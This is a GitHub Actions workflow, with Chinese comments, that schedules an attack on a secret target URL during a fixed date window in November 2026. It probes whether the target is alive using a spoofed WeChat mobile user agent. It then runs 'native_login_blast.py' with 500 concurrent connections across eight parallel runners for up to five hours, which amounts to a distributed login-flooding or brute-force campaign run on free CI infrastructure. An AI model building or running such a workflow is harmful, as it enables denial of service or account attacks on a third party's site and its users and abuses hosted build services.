name: g
on:
  schedule:
    # 北京时间 08:00 = UTC 00:00
    - cron: '0 0 * * *'
    # 北京时间 18:00 = UTC 10:00
    - cron: '0 10 * * *'
  workflow_dispatch:
    inputs:
      dur:
        description: 'seconds'
        default: '18000'
      test:
        description: 'yes = 忽略日期窗口(仅用于验证配置)'
        default: 'no'

jobs:
  guard:
    runs-on: ubuntu-latest
    outputs:
      run_it: ${{ steps.chk.outputs.run_it }}
    steps:
      - id: chk
        env:
          TEST: ${{ github.event.inputs.test || 'no' }}
        run: |
          BJT=$(TZ=Asia/Shanghai date +%Y%m%d)
          echo "bjt=$BJT test=$TEST"
          if [ "$TEST" = "yes" ]; then
            echo "run_it=yes" >> $GITHUB_OUTPUT
            echo "window BYPASSED"
          elif [ "$BJT" -ge "20261117" ] && [ "$BJT" -le "20261120" ]; then
            echo "run_it=yes" >> $GITHUB_OUTPUT
            echo "window OPEN ($BJT)"
          else
            echo "run_it=no" >> $GITHUB_OUTPUT
            echo "window CLOSED ($BJT)"
          fi

  # 打之前先探一下目标是不是还活着；已停用就整轮跳过，不浪费
  probe:
    needs: guard
    if: needs.guard.outputs.run_it == 'yes'
    runs-on: ubuntu-latest
    outputs:
      alive: ${{ steps.p.outputs.alive }}
    steps:
      - id: p
        env:
          TARGET_URL: ${{ secrets.TARGET_URL }}
        run: |
          R=$(curl -sS -k --max-time 20 \
              -H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 MicroMessenger/8.0.49" \
              "${TARGET_URL}/?s=/ApiIndex/index&aid=540&platform=wx" || echo "CURL_FAIL")
          echo "probe resp: ${R:0:160}"
          if echo "$R" | grep -q "账号未启用"; then
            echo "alive=no" >> $GITHUB_OUTPUT
            echo "target DISABLED -> skip this round"
          elif echo "$R" | grep -q "CURL_FAIL"; then
            echo "alive=no" >> $GITHUB_OUTPUT
            echo "target unreachable -> skip"
          else
            echo "alive=yes" >> $GITHUB_OUTPUT
            echo "target alive -> proceed"
          fi

  f:
    needs: [guard, probe]
    if: needs.guard.outputs.run_it == 'yes' && needs.probe.outputs.alive == 'yes'
    runs-on: ubuntu-latest
    timeout-minutes: 310
    strategy:
      fail-fast: false
      max-parallel: 8
      matrix:
        shard: [1,2,3,4,5,6,7,8]
    steps:
      - uses: actions/checkout@v4
      - name: f
        env:
          TARGET_URL: ${{ secrets.TARGET_URL }}
          TARGET_PATH: ${{ secrets.TARGET_PATH }}
          DUR: ${{ github.event.inputs.dur || '18000' }}
        run: |
          echo "start $(TZ=Asia/Shanghai date '+%F %T BJT')"
          python3 native_login_blast.py -c 500 -n "$DUR"
          echo "end $(TZ=Asia/Shanghai date '+%F %T BJT')"
